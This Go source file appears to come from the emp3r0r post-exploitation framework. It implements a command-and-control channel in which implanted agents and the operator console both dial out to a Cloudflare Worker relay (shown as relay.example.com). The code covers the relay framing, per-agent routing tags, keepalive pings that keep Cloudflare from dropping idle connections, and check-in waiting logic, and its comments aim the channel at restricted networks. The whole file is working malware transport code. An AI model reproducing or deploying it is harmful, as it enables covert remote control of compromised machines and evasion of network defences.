// Package transport — c2channel_workerws.go
//
// rendezvous relay channel: both agent and CC dial OUT to a CF Worker relay
// (see emp3r0r-cf-relay/). The Worker pairs the two WebSocket ends per room
// and shuffles opaque bytes; all crypto (SecureConn/MsgAuth) stays end-to-end.
//
// Framing (relay level, see relay_do.js):
//   agent -> relay: raw binary payload
//   relay  -> cc:   [tag byte][payload]
//   cc -> relay:    [tag byte | 0xFF broadcast][payload]
//   relay -> agent: raw binary payload
package transport

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// RelayRoomMsg is the JSON hello/control frame exchanged over the relay WS.
type RelayRoomMsg struct {
	T      string   `json:"t"`
	Role   string   `json:"role,omitempty"`
	Tag    string   `json:"tag,omitempty"`
	Agents []string `json:"agents,omitempty"`
	CC     bool     `json:"cc,omitempty"` // agent hello: whether a CC is in the room
}

// WorkerWSChannelWrapper implements C2ChannelWrapper over the CF relay.
// URL format (agent config CCAddress or CC dial target):
//
//	wss://relay.example.com/ws/<room>?role=<cc|agent>&secret=<shared>
type WorkerWSChannelWrapper struct {
	// TagByte is the relay-level routing marker for CC->agent frames.
	// Agents ignore it (relay strips it before delivery); CC sets it.
	Role string // "agent" (default) or "cc"
}

func init() {
	RegisterC2Channel("worker_ws", "Rendezvous relay over Cloudflare Worker (both ends dial out)", &WorkerWSChannelWrapper{})
}

// ---- shared plumbing --------------------------------------------------------

var relayDialer = &websocket.Dialer{
	HandshakeTimeout: 15 * time.Second,
	TLSClientConfig:  &tls.Config{InsecureSkipVerify: false}, // pinned CA not needed: CF public cert
	ReadBufferSize:   1 << 16,
	WriteBufferSize:  1 << 16,
	// Agent may replace net.DefaultResolver with a DoH resolver whose upstream
	// is unreachable from inside a relay-only network. Relay endpoints must
	// resolve via plain system DNS, so pin an independent dialer here.
	NetDialContext: (&net.Dialer{
		Timeout: 10 * time.Second,
	}).DialContext,
}

// relayConn adapts a websocket to net.Conn-ish io.ReadWriteCloser.
type relayConn struct {
	conn   *websocket.Conn
	role   string
	tag    byte // cc side: current target agent tag byte (0xFF = broadcast)
	tagMu  sync.Mutex
	rbuf   *bytes.Buffer
	isCC   bool
	closed bool
	mu     sync.Mutex
	pingStop chan struct{} // closed by Close() to stop the keepalive pinger
	pingOnce sync.Once
}

// startPinger sends a WebSocket ping every 30s so CF's edge doesn't reap the
// connection as idle (observed as 1006 unexpected EOF after ~19-30min).
// Only the read side of each party needs to stay alive for pong replies to be
// automatic (gorilla handles pong internally); the Worker DO forwards pings
// as binary/text data frames? No — ping/pong are control frames handled by
// the WS stack on both ends, so we ping and gorilla auto-pongs; the DO's
// accept-mode socket does the same. Either way, traffic flows both directions.
func (r *relayConn) startPinger() {
	r.pingStop = make(chan struct{})
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-r.pingStop:
				return
			case <-ticker.C:
				r.mu.Lock()
				if r.closed {
					r.mu.Unlock()
					return
				}
				err := r.conn.WriteControl(websocket.PingMessage,
					[]byte("keepalive"), time.Now().Add(5*time.Second))
				r.mu.Unlock()
				if err != nil {
					return
				}
			}
		}
	}()
}

func (r *relayConn) Read(p []byte) (int, error) {
	for {
		if r.rbuf.Len() > 0 {
			return r.rbuf.Read(p)
		}
		mt, data, err := r.conn.ReadMessage()
		if err != nil {
			return 0, err
		}
		if mt == websocket.TextMessage {
			// control frame from relay (hello/pong/agent-joined) — ignore on data path
			continue
		}
		if r.isCC {
			// strip tag byte
			if len(data) < 1 {
				continue
			}
			data = data[1:]
		}
		r.rbuf.Write(data)
	}
}

func (r *relayConn) Write(p []byte) (int, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.closed {
		return 0, errors.New("relay closed")
	}
	if r.isCC {
		r.tagMu.Lock()
		tag := r.tag
		r.tagMu.Unlock()
		buf := make([]byte, 0, len(p)+1)
		buf = append(buf, tag)
		buf = append(buf, p...)
		if err := r.conn.WriteMessage(websocket.BinaryMessage, buf); err != nil {
			return 0, err
		}
		return len(p), nil
	}
	if err := r.conn.WriteMessage(websocket.BinaryMessage, p); err != nil {
		return 0, err
	}
	return len(p), nil
}

func (r *relayConn) Close() error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.closed {
		return nil
	}
	r.closed = true
	if r.pingStop != nil {
		r.pingOnce.Do(func() { close(r.pingStop) })
	}
	return r.conn.Close()
}

func (r *relayConn) SetTargetAgent(tagByte byte) {
	r.tagMu.Lock()
	r.tag = tagByte
	r.tagMu.Unlock()
}

// net.Conn compatibility shims (same approach as ByteReadWriteCloser)
func (r *relayConn) LocalAddr() net.Addr                { return nil }
func (r *relayConn) RemoteAddr() net.Addr               { return nil }
func (r *relayConn) SetDeadline(t time.Time) error      { return nil }
func (r *relayConn) SetReadDeadline(t time.Time) error  { return nil }
func (r *relayConn) SetWriteDeadline(t time.Time) error { return nil }

// parseRelayURL validates the relay endpoint and extracts role/secret.
func parseRelayURL(raw string) (*url.URL, string, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return nil, "", err
	}
	role := u.Query().Get("role")
	if role == "" {
		role = "agent"
	}
	if role != "agent" && role != "cc" {
		return nil, "", fmt.Errorf("bad relay role %q", role)
	}
	_ = u.Query().Get("secret") // secret validated server-side; kept for compat
	return u, role, nil
}

// dialRelay opens the relay WebSocket and waits for the hello control frame.
// For agent-role dials, it waits until a CC is present in the room (hello.cc):
// otherwise the agent sends its checkin into a void — the DO drops frames
// when no CC is joined — and blocks forever waiting for an ACK.
func dialRelay(ctx context.Context, raw string) (*relayConn, *RelayRoomMsg, error) {
	u, role, err := parseRelayURL(raw)
	if err != nil {
		return nil, nil, err
	}
	// gorilla requires ws:// or wss:// scheme
	wsURL := u.String()
	if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
		// infer from scheme or default to wss for anything non-local
		scheme := "wss"
		if u.Scheme == "http" {
			scheme = "ws"
		}
		wsURL = scheme + "://" + strings.TrimPrefix(wsURL, u.Scheme+"://")
	}
	deadline := time.Now().Add(30 * time.Second)
	for {
		conn, resp, err := relayDialer.DialContext(ctx, wsURL, nil)
		if err != nil {
			if resp != nil {
				return nil, nil, fmt.Errorf("relay dial: %s (HTTP %d)", err, resp.StatusCode)
			}
			return nil, nil, fmt.Errorf("relay dial: %w", err)
		}
		rc := &relayConn{conn: conn, role: role, tag: 0xFF, rbuf: new(bytes.Buffer), isCC: role == "cc"}
		// wait hello (text)
		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		_, raw_hello, err := conn.ReadMessage()
		if err != nil {
			_ = conn.Close()
			return nil, nil, fmt.Errorf("relay hello: %w", err)
		}
		conn.SetReadDeadline(time.Time{})
		var hello RelayRoomMsg
		if err := json.Unmarshal(raw_hello, &hello); err != nil || hello.T != "hello" {
			_ = conn.Close()
			return nil, nil, fmt.Errorf("relay hello invalid: %s", string(raw_hello)[:min(64, len(raw_hello))])
		}
		// agent must not fire its checkin into a CC-less room
		if role == "agent" && !hello.CC {
			_ = conn.Close()
			if time.Now().After(deadline) {
				return nil, nil, fmt.Errorf("relay room has no CC (waited 30s)")
			}
			time.Sleep(2 * time.Second)
			continue
		}
		rc.startPinger()
		return rc, &hello, nil
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ---- agent side: C2ChannelWrapper -------------------------------------------

// Dial implements C2ChannelWrapper (agent -> relay -> cc).
func (w *WorkerWSChannelWrapper) Dial(ctx context.Context, client *http.Client, url string) (io.ReadWriteCloser, *http.Response, error) {
	rc, hello, err := dialRelay(ctx, url)
	if err != nil {
		return nil, nil, err
	}
	_ = hello
	return rc, &http.Response{StatusCode: http.StatusOK}, nil
}

// Accept is not used on the agent side.
func (w *WorkerWSChannelWrapper) Accept(w2 http.ResponseWriter, req *http.Request) (io.ReadWriteCloser, error) {
	return nil, errors.New("Accept not implemented for worker_ws (CC uses CCRelayListener)")
}
